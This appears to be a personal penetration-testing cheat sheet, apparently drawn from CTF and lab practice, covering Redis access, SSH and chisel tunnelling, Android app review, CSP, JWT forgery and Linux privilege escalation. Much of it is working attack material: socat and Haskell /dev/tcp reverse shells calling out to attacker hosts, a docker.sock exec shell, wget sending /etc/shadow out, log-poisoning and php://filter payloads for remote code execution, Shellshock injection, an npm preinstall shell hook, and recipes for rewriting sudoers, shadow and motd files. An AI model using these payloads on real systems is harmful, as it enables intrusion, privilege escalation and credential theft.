* * *
NOTES
* * *

-------------------------------

### Enumerating REDIS

- Use `redis-cli -h [ip]` to connect
- Then, `AUTH [password]` to authenticate

![image](https://github.com/user-attachments/assets/caddc1da-a3d1-4df3-b714-f8aec08b49f8)

- Use `KEYS *` to list all the keys

![image](https://github.com/user-attachments/assets/60222e44-a93f-4435-823a-d9ad4e19e9b3)

- Then, user `GET <key>` to read a key of te string type

![image](https://github.com/user-attachments/assets/56e16e94-337b-45fe-9a5c-99536e5332c3)

- Use `lrange <key> <start number> <stop number>` to read a list

![image](https://github.com/user-attachments/assets/0093c647-0df8-489d-8be6-6aaed2094fae)

-----------------------------

### REFERENCES:

- [Redis Cheatsheet](https://redis.io/learn/howtos/quick-start/cheat-sheet)
  
--------------------------------

### **Webhooks**:

- [Request Catcher](https://requestcatcher.com/)
- [Postb.in](https://www.postb.in/)

---------------------------------

### Portforwarding with SSH and proxychains

- Edit the `/etc/proxychains` file and comment `sock4 127.0.0.1 9050` and change sock5's port value to your desired port

- Connect with dynamic portforwarding with ssh

      ssh -l id_rsa -D {proxychains' sock5 port number}

- To scan the internal network with nmap,use

      proxychains nmap -sT 127.0.0.1

- To local port forward

      sudo ssh -l id_rsa -L {port you want to forwrd through}:127.0.0.1:{remote port discovered}  

-------------------------------

### Removing `\r` in `exploitdb` scripts

    sed -i -e 's/\r$//' <script's name>

--------------------------------

### Port Forwarding with chisel

- Set up a server with `chisel server -p <port> --reverse` on the attacker machine
- On the client's machine, use `./chisel client [chisel server's ip]:[chisel's server port} R:[port you want it to tunnel through on the server's machine]:127.0.0.1:[internal port running a service on the victim's machine]`

---------------------------------

### To replace the root hash by generating a new one

- Use `openssl passwd -6 (password)`
- Clear the root hash in `/etc/shadow` and replace it with your hash, notice the highlighted part

  ![image](https://github.com/user-attachments/assets/8270951c-d313-4bf8-9f28-4ac5a58db988)

- Format-:```root:<hash>:18195:0:99999:7:::```
----------------------------------

### Installing adb-tools on Kali Linux[Ubuntu/Debian]

    sudo apt-get install android-sdk-platform-tools


### ADB-Tools

- Use `adb devices` to see devices connected
- Use `adb shell pm path <package name>` to get the apk package name
- Use `adb pull <package name>` to download apk locally

### STATIC ANALYSIS

- Use this grep examples to check for  weak cryptography e.g exposed private key

          grep -r "SecretKeySpec" *
      
          grep -rli "aes" *
      
          grep -rli "iv"

- To check for exported preferences, check the `AndroidManifest.xml` with grep

      cat AndroidManifest.xml | grep "activity" --color ##To check activities
      cat AndroidManifest.xml | grep "android:allowBackup" --color ## To check the app allows backup access
      cat AndroidManifest.xml | grep "android:debuggable" --color ### Check if the app is debuggable,it makes it easier to reverse engineer if debuggable
      cat AndroidManifest.xml | grep "android:" --color #finding android permissions

- Apps permission
  Apps can be `normal` or `dangerous`, normal perms don't pose risks or dangers if granted but `dangerous` ones pose otherwise

- Discovering Firebase Scanner

  `git clone https://github.com/shivsahni/FireBaseScanner`
  
  - Commands

     `python FireBaseScanner.py -p /path/apk`

--------------------------

### POP3 login

- Use

      telnet <ip> <port>
      USER <username>
      PASS <password>
  
-------------------------- 

### Content-Security-Policy 
- Content-Security-Policy prevents execution of inline javascript code and sets a trusted list of stylesheets,scripts and plugin to be allowed by the browser.
     - Examples of inline javascript

           <script>alert("5");</script>
      
- Use the http header `Content-Security-Policy` to dictate the security policy of the content.

-Essence of the header include
   - Prevents execution of inline scripts
   - Provides a list of a safe external domains for the browser to load scripts

### Directives used by the Content-Security-Policy header

Policy: `Content-Security-Policy: script-src 'self' https://safe-external-site.com; style-src 'self'`

- `Script-src`: It tells the browser where to load scripts from, `self` indicates that scripts should be loaded from the same domain or loaded from domain `https://safe-external-site.com`
- The `style-src` directs the browser to load from the same domain and not an external one.

- You can also create a CSP directive within a `<meta>` tag e.g

  `<meta http-equiv="Content-Security-Policy" content="script-src 'self' https://safe-external-site.com">`

- `unsafe-inline` directives defeats the purpose of CSP and allows execution of inline scripts which is not highly recommended.(Smells like XSS)
- default-src: Defines the default policy for fetching all resources. Whenever a more specific policy is absent, the browser will fallback to the default-src policy directive. Example: default-src 'self' trusted-domain.com
- img-src: Defines valid sources for images, e.g. img-src 'self' img.mydomain.com
- Font-src: Defines valid sources for font resources.
- object-src: Defines valid sources for plugins and external content, like <object> or <embed> elements.
- Media-src: Defines valid sources for audio and video

### Sources allowed
    
    'none' : Match nothing.
    'self': Match the current host domain (same origin, i.e. host and port). Do not match subdomains, though.
    'unsafe-inline': Allow inline JavaScript and CSS.
    'unsafe-eval': Allow dynamic text to JavaScript evaluations.
    domain.example.com: Allow loading resource from the specified domain. To match any subdomain, use the * wildcard, e.g. *.example.com
    https: or ws:: Allow loading resources only over HTTPS or WebSocket.
    nonce-{token}: Allow an inline script or CSS containing the same nonce attribute value.
  
   
### Explaining Nonce

- `Nonce` attribute allows us to use specific inline attributes without the need to enable the `unsafe-inline` attributes.It is an attribute of the `<script>` and `<style>` tag.

### How does it work

- For every request, the server creates a base64 encoded value that cannot be guessed.Then, the server includes it in every allowed inline tag allowed. e.g

  <script nonce="dGhpcyBpcyBhIG5v==">alert("5")</script>

- The nonce is also indicated in the inline `<style>` and `<script>` tag allowed e.g

      Content-Security-Policy: script-src 'nonce-dGhpcyBpcyBhIG5v=='; style-src 'nonce-dGhpcyBpcyBhIG5v=='

--------------------

References:

--------------------

- CSP: [AKSHAY](https://www.writesoftwarewell.com/content-security-policy/)

--------------------

### ABUSING NPM INSTALL node package-lock.json to get shell access

- Change file's details  to
  
              {
              "name": ".nodeitems",
              "scripts": {
                      "preinstall": "[shell code]"
               }
            }

--------------------

### TERMUX: Adding tmux to your ~/.zlogin to prevent errors

      if [-z "$TMUX"]; then
      exec tmux
      fi
- Explanation: $TMUX vsriable prevents nested tmux instances are started on login shells. `exec` will replace current process with a new one i.e. current shell will be terminated and tmux instance with shell inside will be started, so you won't need to exit twice.

-------------------

### Adding tmux to your custom zsh shell

- Add tmux plugin to your plugins

      plugins(tmux)

- Set `ZSH_TMUX_AUTOSTART=true` in your `.zshrc`
- Note that you have to add this assignment before the line

      source $ZSH/oh-my-zsh.sh

-------------------

### 0XTIberius's sql payload

- [OxTiberius'slist](https://tib3rius.com/sqli.html)

-------------------

### Using /usr/bin/script to spawn shell

      /usr/bin/script -qc /bin/bash /dev/null
      ctrl + z
      stty raw -echo; fg; reset

---------------------

### Spawning shell with socat

- Attack Machine
  
      socat file:`tty`,raw,echo=0 tcp-listen:[port]

- Victim machine

      wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[ip]:[port]

-----------------------

### Privesc with PATH HIJACKING

- If the path to a binary is not specified in a script or binary e.g `tar instead of /usr/bin/tar`, you can set the environmental variable with `export PATH=.:$PATH` to check the current directory for our malcious binary before moving to `/usr/bin` to grab a binary.

- Our Malicious tar file should contain this if python3 is present on the victim machine

      #! /usr/bin/env python3 
      print("Malicious me")
      import os
      os.setuid(0)
      os.setgid(0)
      os.system("/bin/bash")

- Python
      
      #! /usr/bin/env python
      print("Malicious me")
      import os
      os.setuid(0)
      os.setgid(0)
      os.system("/bin/bash")

- Use `chmod +x tar` later


### REFERENCES:

- [Nguyen](https://securitynguyen.com/posts/linux-privilege-escalation/path-hijacking-linux-privilege-escalation/)

---------------------------

### Exploiting right to modify ssh motd(message of the day) in `/etc/update-motd.d`

- Write the sh code to 00-header, the code grants suid bit to the bash file copied to a user's directory, `<username>` represents the user you have access to

      echo "cp /bin/bash /home/<username>/bash && chmod u+s /home/<username>/bash" >> /etc/update-motd.d/00-header

- Exit the ssh connection and reconnect, then run

      ./bash -p


### REFERENCES
   
- [HDKS](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/update-motd-privilege-escalation/)

----------------------------------------

### Interesting way to access root

- Add your user to the `/etc/sudoers` file and grant power to execute all commands

      echo "<user> ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers

------------------------------

### Abusing docker.sock unix socket

- If a docker container contains a `docker.sock` file,you can find it with `find / -name docker.sock 2</dev/null`

![image](https://github.com/user-attachments/assets/5bf2e2ef-f333-426b-9dbe-eb414b88e1d6)

- Make it accessible on the machine with socat

      socat TCP-LISTEN:[PORT],reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock

   ### Getting a revshell as root on the container

   - List all containers to get their ids

          curl http://localhost:[port]/containers/json

   - Add the id to this link, replace cmd's value with your rev shell code

         curl http://localhost:8080/containers/[existing container's id]/exec -X POST -H  "Content-Type: application/json" -d '{"AttachStdin":false, "AttachStdout":true, "AttachStderr":true, "Tty":false, "Privileged":false, "Cmd":["socat","TCP:[ip]:[port]","EXEC:bash"]}'

  - Start the container with id from the output the command above

        curl http://localhost:8080/exec/<id>/start -X POST -H "Content-Type: application/json"  -d '{"Detach": false,"Tty": false}'

- Mounting host partition on docker

      mkdir /tmp/mnt
      mount /dev/<partition> /tmp/mnt
      chroot /tmp/mnt
      mount -t proc proc /proc # Mount /proc to allow access to hardware information and running processes

--------------------

### References:

- [Quarkslab](https://blog.quarkslab.com/why-is-exposing-the-docker-socket-a-really-bad-idea.html)
- [Dejandayoff](https://dejandayoff.com/the-danger-of-exposing-docker.sock/)

----------------------

### Privesc with doas 

- Doas allows execution of commands as another user
- Find `doas.conf` with

      find / -name "doas.conf" -type f 2</dev/null

![image](https://github.com/user-attachments/assets/cfc414f8-1003-4122-a731-66f8f096f89b)

- To execute commands,use

       doas -u <user> <command> <args>
       e.g doas -u root rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null

--------------------------

### Exploiting GIT to gain sensitive information


### REFERENCES

- [Some OP medium blog](https://satyasai1460.medium.com/how-git-folder-can-be-exploited-to-access-sensitive-data-eb805c38fd6c)

----------------------------

### PRIVESC with /usr/bin/wget

![image](https://github.com/user-attachments/assets/592ffb4a-8c02-479f-b0be-6bc6b131435d)

- File read,set up a listener with nc on your attack machine to receive
- Send file with

      sudo -u root /usr/bin/wget post-file=/etc/shadow <ip>:<port>

- To receive file

      sudo -u root /usr/bin/wget http://<ip>:<port>/filename -O <save name>

### REFERENCES

- [HDKS](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/)

----------------------------

### LFI2RCE with apache2 server's log

- Log location-:`/var/log/apache2/access.log`
- Host a command shell php code with python's http.server

  ![image](https://github.com/user-attachments/assets/e2e7c58f-4e52-44bc-aaa5-1c3f2cec9e49)

- RCE:
  - Exploit HTTP-Header `User-Agent`
    e.g

         curl http://mafialive.thm/test.php\?view\=/var/www/html/development_testing/.././.././.././.././var/log/apache2/access.log -H "User-Agent: <?php file_put_contents('shell.php',file_get_contents('http://<http server's ip>:<http server'sport>/shell.php')) ?>"
  - Reload the log file to execute code
  - Sometimes you need to set the file path of shell.php to a path with write permissions

 ----------------------------
 
 ### REFERNCES:

 - [Roquenight](https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet)
   
---------------------------------

### Abusing suid flask

- Sudoers rule

![image](https://github.com/user-attachments/assets/5402e95f-60ca-4b2d-a2b3-a5d200399287)
 
- Poc code
  
            import os
            from flask import Flask,render_template_string
            
            app = Flask(__name__)
            os.setuid(0)
            os.setgid(0)
            os.system("bash -p")
            
            @app.route("/")
            def index():
                return render_template_string("Life tuff ooo!!!!")
            
            if __name__ == "__main__":
               app.run(port=8080,debug=True)

- Set the environmetal variables

      export FLASK_APP=app.py
      export FLASK_ENV=development

- Run
       sudo -u root /usr/bin/flask run

- Root

![image](https://github.com/user-attachments/assets/34e3c7a7-03b6-4b1b-b857-bdb93143c5e9)

---------------------------

### Executing Shell Commands with Haskell code

- Save as run.hs

      import System.Process
      
      main = callCommand "bash -c 'bash -i 5<> /dev/tcp/10.8.158.229/1337 0<&5 1>&5 2>&5'"

---------------------------

### REFERENCES:

- [Stack Overflow](https://stackoverflow.com/questions/3470955/executing-a-system-command-in-haskell)

---------------------------

### LFI2RCE with php://filter/

- Characters can be injected via php://temp/ filter
- Generate php code with this [script](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)
  
- Example of `<?=`$_GET[0]`;;?>` as generated by the author

        php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp

- To execute webshell e.g

      http://127.0.0.1/?0=id&file=[filter generated above]

- Sweet RCE[Test on Inclusiveness PG PLAY]
- Script usage for the php filter

      ./filter.py --rawbase64 [base64 encoded php code]

![image](https://github.com/user-attachments/assets/340321c8-e317-4ffa-bd7f-920ae50f57d8)

- Rce

![image](https://github.com/user-attachments/assets/d06ea870-87ae-4115-9b2c-c904ebc511cc)

- It should be noted that if you can read a valid file that is being rendered,you should tweak the script's variable to the file you can read.File `php://temp` is not compulsory,this approach is crucial in a case where a filename is required as a filter.

![image](https://github.com/user-attachments/assets/d5bfe1f8-1e22-4163-85bc-82ed2b73e335)

- Exploiting with valid `/etc/passwd` file

![image](https://github.com/user-attachments/assets/75d87504-5d1d-43ad-9c91-ad76c853a86c)



--------------------------------

### REFERENCES:

- [SundaeGan](https://medium.com/@sundaeGAN/php-wrapper-and-lfi2rce-81c536ef7a06)
- [Script's Link](https://github.com/SENSEiXENUS/senseixenus.github.io/blob/main/posts/Notes/scripts/phpfilter.py)

---------------------------------

### Abusing group `lxd`

- If a user is part of the user `lxd`,we can create a vulnerable container and breakout as root

![image](https://github.com/user-attachments/assets/b84714a0-20dd-440d-a8f1-40e13d8f7bb4)

- Initialize lxd with `lxd init` and add this settings

![image](https://github.com/user-attachments/assets/28d07b8e-944c-4889-9872-6f15b4ff94cf)

- Create this a container in your machine and build with root

      git clone https://github.com/saghul/lxd-alpine-builder.git
      cd lxd-alpine-builder
      ./build-alpine

- Transfer it to the victim machine,receive in the user's home directory

- Import with

      lxc image import [tar file] --alias alpine
      lxc image list #To list images

![image](https://github.com/user-attachments/assets/1fe4327a-67ca-4ef9-9e1f-0b0f634abb78)

- The next step is to run a privileged container, so it runs as root

      lxc init alpine juggernaut -c security.privileged=true
      lxc config device add juggernaut gimmeroot disk source=/ path=/mnt/root recursive=true
      lxc start juggernaut
      lxc list

![image](https://github.com/user-attachments/assets/d3ebab8c-5738-4817-8c9b-5a4bbcadce18)

- Then execute juggernaut

      lxc exec juggernaut sh

- Use `chroot /mnt/root` to change root filesystem since we've mounted it

![image](https://github.com/user-attachments/assets/f7c9426f-b04c-4539-bce9-2afa182b4ec8)

- Then,you can replace the root hash in `/etc/shadow` and login as root

---------------------

### REFERENCES

- [Juggernaut Sec](https://juggernaut-sec.com/lxd-container/)

----------------------

### Attacking JWTs [JSON Web Token]

- It is a standardized format of cryptographically signed json data between systems.It is used for authentication, session handling and access control mechanisms.

### JWT formats

- It consist of 3 headers,which includes `header`,`payload` and `signature`.The header consists of metadata of a token, the payload contains the user details or claim.It should be noted that this headers are base64 encoded e.g

- Typical Jwt:

      eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA
  
- Header-:

      eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9

- Payload-:

        eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ

- Base64 decoded value of the payload-:

        {"iss":"portswigger","exp":1648037164,"name":"Carlos Montoya","sub":"carlos","role":"blog_author","email":"carlos@carlos-montoya.net","iat":1516239022fQ

- The signature is generated by hashing the header and payload. In order to generate the token, a secret signing key is required, the server hashes the header and payload with the secret key to generate the jwt.The signing key is required to generate the correct signature of header and payload.

### JWT vs JWS vs JWE

- JSON Web Token is not used without Json Web Signature and JSON Web Encryption, When people use the term `JWT` , it also means a JWS token. JWEs are very similar except the actual contents are encrypted and not encoded.


### Vulnerabilities

### FLAWED SIGNATURES VERIFICATION

- Servers don't usually store any information about the JWTs that they issue. Instead, each token is an entirely self-contained entity. This has several advantages, but also introduces a fundamental problem - the server doesn't actually know anything about the original contents of the token, or even what the original signature was. Therefore, if the server doesn't verify the signature properly, there's nothing to stop an attacker from making arbitrary changes to the rest of the token

- Jwt libraries provide a way for verifying and decoding them, e.g the Node.js library `jsonwebtoken` has methods `verify()` and `decode()`. Occassionally, developers confuse this two methods and pass the token to `decode()` which doe not verify the signature.With this flaw, we can sign cookies for other users.


### Accepting JWTS with no signature

- The jwt token has an `alg` headers which states the algorithmn technique used to sign the token.Although, some servers allow the `none` which is flawed and unsigned with the secret key.Due to the obvious dangers of this, servers usually reject tokens with no signature. However, as this kind of filtering relies on string parsing, you can sometimes bypass these filters using classic obfuscation techniques, such as mixed capitalization and unexpected encodings.Even if the token is unsigned, the payload part must still be terminated with a trailing dot.

- A tampered one, this should be the structure, set the header's alg to not and tweak the payload's user but it must end wit a trailing dot.

          eyJraWQiOiJiODU0Yjg0Mi0wMzM5LTQ0ZGEtYjM4Zi05ODQ2ODRiOTE1MDYiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcyNTU2OTk3Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.

Decoded header||payload-:```{"kid":"b854b842-0339-44da-b38f-984684b91506","alg":"none}||{"iss":"portswigger","exp":1725569977,"sub":"administrator"}```

### JWT SECRET KEY BRUTE FORCE

- Some signing algorithms, such as HS256 (HMAC + SHA-256), use an arbitrary, standalone string as the secret key. Just like a password, it's crucial that this secret can't be easily guessed or brute-forced by an attacker. Otherwise, they may be able to create JWTs with any header and payload values they like, then use the key to re-sign the token with a valid signature.

- Bruteforce with hashcat with
  
      hashcat -a 0 -m 16500 <jwt> <wordlist>

- Use `hashcat --show <jwt>` to see a the secret

  ![image](https://github.com/user-attachments/assets/47c684e4-b0a3-4f81-a514-843a00279d6e)

### JWT PARAMETER Headers Injection

 According to the JWS specification, only the alg header parameter is mandatory. In practice, however, JWT headers (also known as JOSE headers) often contain several other parameters. The following ones are of particular interest to attackers.

    jwk (JSON Web Key) - Provides an embedded JSON object representing the key.

    jku (JSON Web Key Set URL) - Provides a URL from which servers can fetch a set of keys containing the correct key.

    kid (Key ID) - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching kid parameter.

- As you can see, these user-controllable parameters each tell the recipient server which key to use when verifying the signature. 


### Injecting self-signed JWTs via the jwk parameter

- The JSON Web Signature (JWS) specification describes an optional jwk header parameter, which servers can use to embed their public key directly within the token itself in JWK format
- Example:
      
        {
          "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
          "typ": "JWT",
          "alg": "RS256",
          "jwk": {
              "kty": "RSA",
              "e": "AQAB",
              "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
              "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
          }
      }
- Ideally, servers should only use a limited whitelist of public keys to verify JWT signatures. However, misconfigured servers sometimes use any key that's embedded in the jwk parameter.

### Exploiting with JWT_EDITOR

- Generate a new RSA key with JWT Editor

![image](https://github.com/user-attachments/assets/7100ee8e-5bf1-4a12-aad0-00db0cf5ba0c)

- Intercept a request with burp suite proxy and send to the repeater

![image](https://github.com/user-attachments/assets/1695cdf0-1017-4b1d-8e1d-a318029ec6cb)

- Rightclick and  pick `copy public key as JWK` in the JWT_Editor tab
- Go to the json web token tab in the repeater to tweak the token

![image](https://github.com/user-attachments/assets/00420fc6-887f-4a99-b3fa-2d38c97566e4)

- Create an key `jwt` to hold the public key object

![image](https://github.com/user-attachments/assets/08b5da20-da59-48b7-8726-55fdad16b3a6)

- Then, add the replace the `kid` key with the new public key `kid`.

![image](https://github.com/user-attachments/assets/6797f61a-66c9-494e-8cc8-a5210743ac28)

- Click on attack and `embedded jwt` later

![image](https://github.com/user-attachments/assets/1f2aa050-eb51-4da0-8e01-5d07bcea496f)

- Admin access

![image](https://github.com/user-attachments/assets/c169a215-3e76-43db-bb2e-2578492454f2)

### Injecting self signed JWTs via the url endpoint

- Instead of embedding private keys with the `jwk` ,some servers allow you use `jku` (JWK set url) to reference a set containing the key.A jwk key is a json object containing array representing different keys.e.g

      {
          "keys": [
              {
                  "kty": "RSA",
                  "e": "AQAB",
                  "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
                  "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
              },
              {
                  "kty": "RSA",
                  "e": "AQAB",
                  "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
                  "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
              }
          ]
      }


-  JWK Sets like this are sometimes exposed publicly via a standard endpoint, such as `/.well-known/jwks.json`.More secure websites will only fetch keys from trusted domains, but you can sometimes take advantage of URL parsing discrepancies to bypass this kind of filtering.[Sliding to SSRF to learn some stuffs]

---------------------------

### Compiling exploit error: no cc1 in directory

![image](https://github.com/user-attachments/assets/c6adac8b-c767-4656-a1b1-3b7f9f1eb75a)

- It happens if `/usr/bin` is not added to the PATH environmental variable

  ![image](https://github.com/user-attachments/assets/17b40813-87eb-48e9-9cc7-f27f871a0125)

- Add it to the path with

      export PATH=/usr/bin:$PATH

![image](https://github.com/user-attachments/assets/60592489-d0dd-41a7-a944-022247589547)

--------------------------

### Exploiting Shellshock

- Inject payload in `User-Agent` header

      curl -i -H "User-agent: () { :;}; echo; [command]" [host]/[cgi_script]

- The binary path should be detailed to execute shell commands e.g `/bin/ls` or `/bin/cat`

![image](https://github.com/user-attachments/assets/7542f360-aeb5-4355-a2ea-cc30d3644928)


--------------------

### REFERENCES:

- [Shellshock in cgi scripts](https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock)

--------------------

### READING FILES WITH ECHO

- Use

      echo "$(<[filename])"

---------------------

### PENTESTING TEAM CITY

- Grep for super token with ` grep -rni 'authentication token' TeamCity/logs 2</dev/null`

![image](https://github.com/user-attachments/assets/861f4f8e-43de-4b16-8ea2-92ffa727aaa3)

### Exploit with this steps

- Create a new project, pick "manually"

![image](https://github.com/user-attachments/assets/e0a9ec77-75e0-4dce-96f0-010b60570c8a)

- Create a build configuration

![image](https://github.com/user-attachments/assets/86bf10a6-27d2-4552-852a-5d0c604b4094)

- Click on build steps

![image](https://github.com/user-attachments/assets/57a9b4d2-6687-4eea-be50-6c77b5c97ce8)

- Then, add a build step, set the runner type to `command line` and copy any bash reverse shell code and save

![image](https://github.com/user-attachments/assets/09f05185-e513-4543-984c-68bfdbb22b09)

- Click on run to spawn a reverse shell as root

![image](https://github.com/user-attachments/assets/230358c8-5466-465e-a4cc-af12c31320e0)

- Reverse shell as root

![image](https://github.com/user-attachments/assets/32893314-b416-4008-9a94-fa6d8c90a3b0)

------------------------------

### REFERENCES:

- [Pentesting Team City](https://exploit-notes.hdks.org/exploit/web/teamcity-pentesting/)

------------------------------

### Pentesting Rsync

- Use rsync to interact with the service
- `rsync <hosst>::` to check for directories

